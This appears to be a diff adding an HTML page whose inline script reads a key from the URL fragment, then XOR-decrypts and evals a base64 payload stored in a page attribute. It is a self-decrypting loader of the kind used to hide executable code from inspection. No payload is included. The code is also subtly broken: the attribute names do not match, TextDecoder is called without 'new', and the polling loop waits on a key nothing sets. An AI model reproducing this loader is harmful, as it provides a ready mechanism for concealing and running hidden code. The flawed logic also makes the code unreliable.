@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script>
+
+    let key, int;
+    if(!key){
+      let split = window.location.href.split('#');
+      if(split.length === 2){key=split[1];}
+    }
+
+    if(!key){
+      int = setInterval(() => {
+        if(key){
+          clearInterval(int);
+          let encoder = new TextEncoder();
+          key = encoder.encode(key);
+          let input = encoder.encode(window.atob(document.getElementById("root").getAttribute("loader_payload")));
+          for(let i=0; i<input.byteLength; i++){input[i] = input[i]^key[i%key.byteLength];}
+          eval(TextDecoder("utf8").decode(input));
+        }
+      }, 1000);
+    }
+
+  </script>
+</head>
+<body>
+<div id="root" loader_attr="loader_payload"></div>
+</body>
+</html>
